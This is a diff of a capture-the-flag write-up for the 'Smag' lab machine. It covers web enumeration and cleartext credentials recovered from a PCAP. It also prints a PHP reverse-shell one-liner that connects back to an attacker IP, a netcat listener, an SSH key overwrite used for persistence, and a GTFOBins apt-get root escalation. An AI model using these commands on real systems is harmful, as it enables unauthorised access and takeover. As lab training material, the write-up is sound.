@@ -13,10 +13,10 @@
 
 I started with the usual web enumeration checklist:
 
-- Directory brute-forcing
-- Virtual host fuzzing
-- Manual browsing
-- Source code review
+- Directory `brute-forcing`
+- Virtual host `fuzzing`
+- `Manual browsing`
+- `Source code review`
 - `robots.txt`
 
 
@@ -26,14 +26,16 @@ I started with the usual web enumeration checklist:
 
 Running `dirsearch` quickly paid off:
 
+<img width="1405" height="759" alt="image" src="https://github.com/user-attachments/assets/728f551c-8bda-43d7-8a7e-1baa0c9ef4c8" />
 
-bash
-dirsearch -u http://smag.thm
+
+`bash
+dirsearch -u http://smag.thm`
 
 
 📁 Interesting find:
 
-/mail
+`/mail`
 
 This directory turned out to be key later on.
 
@@ -54,19 +56,16 @@ ffuf -u http://smag.thm -H "Host: FUZZ.smag.thm" -w /usr/share/wordlists/seclist
 While browsing the site, I discovered a PCAP file.
 Downloaded it directly:
 
-wget http://smag.thm/path/to/file.pcap
+`wget http://smag.thm/path/to/file.pcap`
 
-Wireshark Findings
-
+# Wireshark Findings # 
 Opening the file in Wireshark revealed credentials in cleartext:
 
-username: helpdesk
-password: cH4nG3M3_n0w
+<img width="939" height="416" alt="image" src="https://github.com/user-attachments/assets/065691c8-1041-40f5-9839-616f2cb66c12" />
 
 
-
-
-
+`username: helpdesk'
+'password: cH4nG3M3_n0w`
 
 🚨 Always inspect PCAPs — people leave secrets everywhere.
 
@@ -76,12 +75,10 @@ Checking robots.txt revealed something interesting:
 
 <!-- <a>Bcc: trodd@smag.thm</a> -->
 
-
+<img width="1474" height="463" alt="image" src="https://github.com/user-attachments/assets/7ebd979a-f06f-4e51-9d74-7e037d1a90d1" />
 
 
 Not directly exploitable on its own, but another confirmation that email was part of the intended path.
-
-
 
 
 🔐 Web Login & Reverse Shell
@@ -92,13 +89,13 @@ Listener
 
 On my machine:
 
-nc -nvlp 1234
+`nc -nvlp 1234`
 
 Reverse Shell Payload
 
 Executed on the target:
 
-/usr/bin/php -r '$sock=fsockopen("192.168.138.111",1234);exec("sh <&3 >&3 2>&3");'
+`/usr/bin/php -r '$sock=fsockopen("192.168.138.111",1234);exec("sh <&3 >&3 2>&3");'`
 
 
 Boom — shell access.
@@ -110,13 +107,17 @@ Boom — shell access.
 
 To make the shell usable:
 
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+`python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm`
 
 
 Now we’ve got a proper interactive shell.
 
 
+# Run LinPeas # 
+ with `LinPeas` we found that we can edit 
+
+ <img width="876" height="28" alt="image" src="https://github.com/user-attachments/assets/0a235cef-953d-4574-8026-4474e583aeb1" />
 
 
 
@@ -125,7 +126,7 @@ Now we’ve got a proper interactive shell.
 Instead of brute forcing or guessing passwords, I went the cleaner route: SSH key replacement.
 
 Generate SSH Keys (Attacker Machine)
-ssh-keygen -t rsa
+`ssh-keygen -t rsa`
 
 
 This generates:
@@ -136,10 +137,10 @@ A public key
 
 Example using a custom name:
 
-ssh-keygen -f jake
+`ssh-keygen -f jake`
 
 
-Result:
+# Result #
 
 jake      (private key)
 jake.pub  (public key)
@@ -148,7 +149,7 @@ Overwrite Victim’s Public Key
 
 Using the shell access, I replaced Jake’s public key backup:
 
-echo "YOUR_PUBLIC_KEY_HERE" > /opt/.backups/jake_id_rsa.pub.backup
+`echo "YOUR_PUBLIC_KEY_HERE" > /opt/.backups/jake_id_rsa.pub.backup`
 
 
 
@@ -161,8 +162,8 @@ echo "YOUR_PUBLIC_KEY_HERE" > /opt/.backups/jake_id_rsa.pub.backup
 
 Once logged in as jake:
 
-cat user.txt
-
+`cat user.txt`
+`redacted`
 
 ✅ User flag obtained.
 
@@ -170,22 +171,23 @@ cat user.txt
 
 Time for the classic:
 
-sudo -l
+`sudo -l`
 
 
 This revealed a command that could be run as root.
 
-Checking GTFOBins, I found a matching privilege escalation technique.
-(
+`Checking GTFOBins, I found a matching privilege escalation technique.`
+
 
 When the shell exits the update command is actually executed.
 
-sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`
 
-)
+
 After exploiting it:
 
-cat root.txt
+`cat root.txt`
 
 
 🎉 Root flag captured.
+`redacted`
